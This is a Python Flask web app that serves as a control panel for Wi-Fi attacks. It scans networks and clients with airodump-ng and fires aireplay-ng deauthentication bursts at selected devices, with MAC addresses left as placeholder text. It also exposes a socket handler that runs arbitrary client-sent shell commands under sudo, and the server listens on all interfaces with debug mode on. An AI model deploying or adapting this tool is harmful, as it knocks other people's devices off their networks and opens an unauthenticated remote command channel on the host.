#!/usr/bin/env python3
from flask import Flask, render_template, request, jsonify
import subprocess
import threading
from flask_socketio import SocketIO, emit
import threading
import os
import re
import signal
import time
from threading import Lock, Thread

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_secret_key'
socketio = SocketIO(app)

current_process = None
output_data = []
output_lock = Lock()

def is_mac_addr(s):
    return re.match(r"([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})", s) is not None


def execute_and_stream_airodump(command):
    global output_data
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
                               universal_newlines=True, shell=True, preexec_fn=os.setsid)

    while True:
        line = process.stdout.readline()
        if not line:
            break
        socketio.emit('update_output', {'data': line})

        with output_lock:
            output_data.append(line)


def process_airodump_output():
    global output_data
    processed_data = []
    with output_lock:
        for line in output_data:
            if "some_condition" in line:
                processed_data.append(line)

    print(processed_data)


def extract_stations(input_text):
    station_pattern = re.compile(
        r'(?P<BSSID>(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})\s+'
        r'(?P<STATION>(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})\s+'
        r'(?P<PWR>-?\d+)\s+'
        r'(?P<Rate>[\d\.\-e]+)\s+'
        r'(?P<Lost>\d+)\s+'
        r'(?P<Frames>\d+)'
    )

    matches = station_pattern.finditer(input_text)

    stations = [
        match.groupdict() for match in matches
    ]
    if len(stations) == 0:
        stations = ['FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE', 'FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE', 'FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE']

    return stations

def parse_airodump_output(output):
    lines = output.strip().split('\n')
    extracted_data = []

    for line in lines:
        parts = line.split()

        if len(parts) >= 11 and is_mac_addr(parts[0]):
            bssid = parts[0]
            pwr = parts[1]
            ch = parts[5]
            essid = parts[-2]
            extracted_data.append([bssid, pwr, ch, essid])
    return extracted_data


def run_command_for_duration(command, duration=20):
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True,
                               preexec_fn=os.setsid)
    time.sleep(duration)
    os.killpg(os.getpgid(process.pid), signal.SIGINT)
    try:
        outs, errs = process.communicate(timeout=10)
    except subprocess.TimeoutExpired:
        os.killpg(os.getpgid(process.pid), signal.SIGKILL)
        outs, errs = process.communicate()
    return outs, errs

def run_command_for_duration_two(command, duration=20):
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True,
                               preexec_fn=os.setsid, encoding='utf-8', errors='ignore')
    time.sleep(duration)
    os.killpg(os.getpgid(process.pid), signal.SIGINT)
    try:
        outs, errs = process.communicate(timeout=10)
    except subprocess.TimeoutExpired:
        os.killpg(os.getpgid(process.pid), signal.SIGKILL)
        outs, errs = process.communicate()
    return outs, errs



def parse_and_filter_airodump_output(output):
    extracted_data = parse_airodump_output(output)
    essid_max_pwr = {}
    for data in extracted_data:
        bssid, pwr, ch, essid = data
        pwr = int(pwr)
        if essid not in essid_max_pwr or pwr > essid_max_pwr[essid][1]:
            essid_max_pwr[essid] = [bssid, pwr, ch, essid]
    filtered_data = list(essid_max_pwr.values())
    return filtered_data


@app.route('/')
def index():
    buttons = ['Button 1', 'Button 2', 'Button 3']
    return render_template('index.html', buttons=buttons)

@app.route('/device-info', methods=['POST'])
def device_info():
    global device_information
    print("Hit device_info button")
    get_devices_cmd = "sudo airodump-ng wlan1 --bssid FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE --channel 6"
    out, _ = run_command_for_duration_two(get_devices_cmd, 30)
    print("Start Out")
    print(out)
    print("End Out")
    device_information = extract_stations(out)
    print(device_information)
    return jsonify(out)

@app.route('/execute', methods=['POST'])
def execute():
    final_order = request.json['order']
    print(final_order)
    return jsonify({'status': 'success'})

def emit_command_output(command):
    global current_process
    try:
        current_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, shell=True)
        while current_process.poll() is None:
            output_line = current_process.stdout.readline()
            if output_line:
                socketio.emit('update_output', {'data': output_line})
            else:
                break
    except Exception as e:
        socketio.emit('update_output', {'data': f"Error: {str(e)}"})
    finally:
        if current_process is not None:
            current_process.terminate()
            current_process = None

@app.route('/start-deauth', methods=['POST'])
def start_deauth():
    data = request.json
    device_mac = data.get('selectedDevice')
    command_1 = "sudo aireplay-ng --deauth 30 -c " + "FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE" + " -a FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE" + " wlan1"
    command_2 = "sudo aireplay-ng --deauth 30 -c " + "FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE" + " -a FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE" + " wlan1"
    if device_mac == "FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE (TP-Link)":
        emit_command_output(command_1)
    elif device_mac == "FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE (TP-Link)":
        emit_command_output(command_2)
    elif device_mac == "FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE & FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE":
        thread_1 = Thread(target=emit_command_output, args=(command_1,))
        thread_2 = Thread(target=emit_command_output, args=(command_2,))
        thread_1.start()
        thread_2.start()
        thread_1.join()
        thread_2.join()
    else:
        pass
    return jsonify({'status': 'success'})

@socketio.on('execute_command')
def handle_execute_command(command):
    global current_process
    if current_process is not None:
        current_process.terminate()
    thread = threading.Thread(target=emit_command_output, args=([command],))
    thread.daemon = True
    thread.start()

@socketio.on('stop_output')
def handle_stop_output():
    global current_process
    if current_process is not None:
        current_process.terminate()
        current_process = None
    emit('output_stopped', {'message': 'Output streaming has been stopped.'})


def airodump_task():
    command = "sudo airodump-ng wlan1"
    duration = 20
    stdout, stderr = run_command_for_duration(command, duration)
    filtered_data = parse_and_filter_airodump_output(stdout)
    for data in filtered_data:
        socketio.emit('update_output', {'data': str(data)})



@app.route('/execute-airodump', methods=['POST'])
def execute_airodump():
    global ap_info
    command = "sudo airodump-ng wlan1"
    duration = 20
    outs, errs = run_command_for_duration(command, duration)
    print(outs)
    ap_info = parse_and_filter_airodump_output(outs)
    print(ap_info)
    return jsonify(outs)

@app.route('/get-connected-devices', methods=['POST'])
def get_connected_devices():
    stations = ['FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE (TP-Link)', 'FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE', 'FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE (TP-Link)', 'FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE & FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE:FIX: INSERT YOUR MAC ADDRESS HERE']
    return jsonify(stations)


@socketio.on('start_airodump')
def handle_start_airodump(json):
    print('Starting airodump-ng...')
    command = "sudo airodump-ng wlan1"
    thread = threading.Thread(target=execute_and_stream_airodump, args=([command],))
    thread.daemon = True
    thread.start()
    print("Thread for streaming AP info has been started.")

def execute_sudo_command(command):
    try:
        completed_process = subprocess.run(['sudo', command], shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return completed_process.stdout, completed_process.stderr
    except subprocess.CalledProcessError as e:
        return None, str(e)

@app.route('/get-ap-info')
def get_ap_info():
    global ap_info
    return jsonify(ap_info)

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', debug=True)
